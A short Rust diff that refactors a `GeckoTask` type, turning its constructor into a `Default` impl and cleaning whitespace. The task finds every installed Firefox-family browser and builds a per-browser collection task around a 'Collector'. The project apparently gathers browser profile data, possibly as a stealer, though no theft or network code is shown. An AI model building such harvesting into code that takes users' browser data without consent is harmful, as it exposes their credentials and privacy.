@@ -13,22 +13,22 @@ use filesystem::storage::StorageFileSystem;
 use filesystem::FileSystem;
 use tasks::{composite_task, CompositeTask, Task};
 
-pub struct GeckoTask<'a, C: Collector, F: FileSystem> {
+pub(crate) struct GeckoTask<'a, C: Collector, F: FileSystem> {
     tasks: Vec<(Arc<GeckoBrowserData<'a>>, CompositeTask<C, F>)>
 }
 
-impl<C: Collector, F: FileSystem> GeckoTask<'_, C, F> {
-    pub(crate) fn new() -> Self {
+impl<C: Collector + 'static, F: FileSystem + 'static> Default for GeckoTask<'_, C, F> {
+    fn default() -> Self {
         let all_browsers = get_gecko_browsers();
         let mut tasks = Vec::new();
-        
+
         for base_browser in all_browsers {
             let Some(browser) = get_browser_data(&StorageFileSystem, base_browser) else {
                 continue
             };
-            
+
             let browser = Arc::new(browser);
-            
+
             tasks.push((
                 browser.clone(),
                 composite_task!(
@@ -37,7 +37,7 @@ impl<C: Collector, F: FileSystem> GeckoTask<'_, C, F> {
                 )
             ))
         }
-        
+
         Self { tasks }
     }
 }
